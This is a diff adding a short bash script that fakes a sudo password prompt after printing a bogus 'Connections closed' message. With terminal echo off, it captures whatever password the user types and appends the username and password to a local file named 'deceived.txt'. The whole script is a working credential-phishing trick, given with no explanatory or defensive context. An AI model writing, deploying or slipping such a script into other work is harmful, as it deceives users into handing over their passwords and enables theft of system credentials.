@@ -1,0 +1,9 @@
+#! bin/bash
+
+echo "Connections closed"
+echo; echo;
+echo -n "[sudo] password for $USER: ";
+
+stty -echo;read PASSWD;stty echo
+echo "$USER:$PASSWD" >>/home/$USER/bashscripts/deceived.txt
+
